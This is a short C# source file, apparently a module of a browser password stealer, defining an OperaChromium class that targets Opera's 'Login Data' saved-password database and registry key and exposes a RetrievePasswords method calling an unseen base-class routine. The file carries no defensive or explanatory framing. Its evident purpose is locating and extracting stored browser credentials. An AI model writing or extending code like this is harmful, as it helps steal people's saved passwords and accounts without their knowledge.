namespace xoxoxo.Chromium
{
    internal sealed class OperaChromium : ChromiumBase
    {
        public OperaChromium()
        {
            SetValues();
        }

        private void SetValues()
        {
            ActualDataPath = AppData + "\\Opera Software\\Opera Stable\\Login Data";
            RegistryPath = "SOFTWARE\\Opera Software";
        }

        public void RetrievePasswords()
        {
            RetrieveData();
        }
    }
}